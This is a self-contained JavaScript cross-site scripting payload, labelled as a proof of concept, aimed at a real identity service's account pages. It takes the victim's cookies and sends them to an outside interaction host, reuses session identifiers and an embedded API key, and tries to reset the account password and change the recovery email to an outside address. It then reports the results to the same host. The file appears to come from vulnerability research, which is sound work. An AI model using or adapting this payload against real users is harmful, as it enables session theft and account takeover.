(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var log=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
})
}

var sid=gc('ius_session');
var vid=gc('ivid');
var userId=gc('userIdentifier');

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);

function mkHdrs(extra){
var h={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_tid':uid(),
'intuit_flowid':uid()
};
if(sid){h['intuit_sessionid']=sid;h['intuit_profilingid']=sid}
if(vid)h['intuit_visitorid']=vid;
if(userId)h['intuit_routingid']=userId;
if(extra)for(var k in extra)h[k]=extra[k];
return h
}

var gql='https://accounts.intuit.com/identity-api/v2/graphql';
var pwdMut='mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}';
var pwdBody=JSON.stringify({query:pwdMut,variables:{input:{newPassword:'Poc@2027'}},operationName:'ReplacePassword'});

try{

log.push('=== Attempt 1: Load security page first ===');
var secPage=await fetch('https://accounts.intuit.com/app/account-manager/security',{credentials:'include',headers:{'Accept':'text/html'}});
log.push('security page status: '+secPage.status);
var secText=await secPage.text();
var flowMatch=secText.match(/flowId['":\s]+([a-f0-9-]{36})/i);
if(flowMatch) log.push('found flowId in page: '+flowMatch[1]);
else log.push('no flowId in page html (searched '+secText.length+' chars)');

log.push('=== Attempt 2: Password change with page-loaded session ===');
var r2=await fetch(gql,{method:'POST',credentials:'include',headers:mkHdrs(flowMatch?{intuit_flowid:flowMatch[1]}:{}),body:pwdBody});
var t2=await r2.text();
log.push('result: '+t2);

log.push('=== Attempt 3: Without Authorization header ===');
var h3=mkHdrs();
delete h3['Authorization'];
var r3=await fetch(gql,{method:'POST',credentials:'include',headers:h3,body:pwdBody});
var t3=await r3.text();
log.push('result: '+t3);

log.push('=== Attempt 4: Introspect available mutations ===');
var introQ='{__type(name:"Mutation"){fields{name}}}';
var r4=await fetch(gql,{method:'POST',credentials:'include',headers:mkHdrs(),body:JSON.stringify({query:introQ})});
var t4=await r4.text();
log.push('mutations: '+t4.substring(0,800));

log.push('=== Attempt 5: Try identityUpdateEmail ===');
var emailMut='mutation UpdateEmail($input:Identity_UpdateEmailAddressInput!){identityUpdateEmailAddress(input:$input){__typename ...on Identity_UpdateEmailAddressSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}}}';
var r5=await fetch(gql,{method:'POST',credentials:'include',headers:mkHdrs(),body:JSON.stringify({query:emailMut,variables:{input:{emailAddress:'nasseurpay@gmail.com'}},operationName:'UpdateEmail'})});
var t5=await r5.text();
log.push('email result: '+t5);

(new Image).src=O+'/xss-results?d='+encodeURIComponent(log.join('|').substring(0,1500));

document.body.innerHTML='<div style="font:12px monospace;background:#111;color:#0f0;padding:20px;min-height:100vh;word-break:break-all">'
+'<h1 style="color:red">XSS PoC — Debug</h1>'
+'<pre style="color:#0f0;white-space:pre-wrap">'+log.join('\n')+'</pre></div>'

}catch(e){
log.push('ERROR: '+e.message+' | '+e.stack);
(new Image).src=O+'/xss-err?e='+encodeURIComponent(e.message);
document.body.innerHTML='<div style="font:12px monospace;background:#111;color:red;padding:20px"><pre>'+log.join('\n')+'</pre></div>'
}
})();
